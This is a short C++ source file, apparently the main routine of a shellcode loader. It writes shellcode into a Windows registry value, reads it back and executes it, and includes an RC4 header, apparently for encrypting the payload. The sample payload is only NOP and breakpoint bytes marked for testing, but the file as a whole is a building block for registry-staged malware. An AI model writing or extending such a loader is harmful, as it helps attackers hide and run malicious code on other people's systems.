#include "registry_utils.h"
#include "shellcode_handler.h"
#include "rc4.h"
#include <iostream>
#include <vector>

int main() {
    std::string registryKey = "Software\\MyApp\\Payload";
    std::string valueName = "Shellcode";

    // Sample shellcode for testing
    BYTE shellcode[] = { 0x90, 0x90, 0xCC }; // NOP NOP INT3 (Breakpoint)
    DWORD shellcodeSize = sizeof(shellcode);

    // Write shellcode to registry
    if (WriteShellcodeToRegistry(registryKey, valueName, shellcode, shellcodeSize)) {
        std::cout << "Shellcode written to registry successfully.\n";
    }
    else {
        std::cerr << "Failed to write shellcode to registry.\n";
        return 1;
    }

    // Read shellcode from registry
    BYTE buffer[1024];
    if (ReadShellcodeFromRegistry(registryKey, valueName, buffer, sizeof(buffer))) {
        std::cout << "Shellcode read from registry successfully.\n";
    }
    else {
        std::cerr << "Failed to read shellcode from registry.\n";
        return 1;
    }

    // Execute the shellcode
    ExecuteShellcode(buffer, shellcodeSize);

    return 0;
}
